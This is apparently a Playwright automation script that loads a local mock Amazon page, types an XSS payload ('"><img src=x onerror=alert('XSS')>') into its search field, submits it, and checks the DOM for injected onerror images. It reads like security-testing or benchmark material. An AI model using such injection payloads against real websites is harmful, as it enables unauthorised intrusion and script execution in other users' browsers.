import path from 'path';

export default async function(page, fileUrl, screenshotsDir) {
  try {
    // Navigate to the HTML file
    await page.goto(fileUrl);
    await page.waitForLoadState('networkidle');

    // Take initial screenshot
    const screenshots = [];
    const step1 = path.join(screenshotsDir, 'step_1_initial.png');
    await page.screenshot({ path: step1 });
    screenshots.push(step1);

    // Wait for the search input using placeholder attribute (alternative selector)
    await page.waitForSelector('input[placeholder="Search Amazon"]', { timeout: 7000 });

    // XSS payload
    const xssPayload = `"><img src=x onerror=alert('XSS')>`;

    // Type the payload using a different selector strategy (CSS attribute selector)
    await page.fill('input[placeholder="Search Amazon"]', xssPayload);

    // Take screenshot after filling input
    const step2 = path.join(screenshotsDir, 'step_2_payload_filled.png');
    await page.screenshot({ path: step2 });
    screenshots.push(step2);

    // Wait for the search button using XPath (alternative selector)
    const searchBtnXPath = '//button[contains(@class, "search-btn")][1]';
    await page.waitForSelector(searchBtnXPath, { timeout: 5000 });

    // Click the search button
    await page.click(searchBtnXPath);

    // Wait for possible DOM update or XSS effect (wait for 2 seconds)
    await page.waitForTimeout(2000);

    // Take screenshot after search
    const step3 = path.join(screenshotsDir, 'step_3_after_search.png');
    await page.screenshot({ path: step3 });
    screenshots.push(step3);

    // Extract any img tags with onerror attribute in the DOM (to check for XSS injection)
    const xssImages = await page.$$eval('img[onerror]', imgs =>
      imgs.map(img => ({
        outerHTML: img.outerHTML,
        src: img.src,
        onerror: img.getAttribute('onerror')
      }))
    );

    // Extract any alerts or visible evidence of XSS (e.g., check for injected HTML in the DOM)
    const bodyHTML = await page.evaluate(() => document.body.innerHTML);

    return {
      success: true,
      action: "Attempted XSS via search input with alternative selectors and captured DOM state.",
      extractedData: {
        xssImages,
        bodyContainsPayload: bodyHTML.includes('onerror=alert(\'XSS\')') || bodyHTML.includes('alert("XSS")')
      },
      screenshots,
      error: null
    };
  } catch (error) {
    return {
      success: false,
      action: "Failed to complete task",
      extractedData: {},
      screenshots: [],
      error: error.message
    };
  }
}
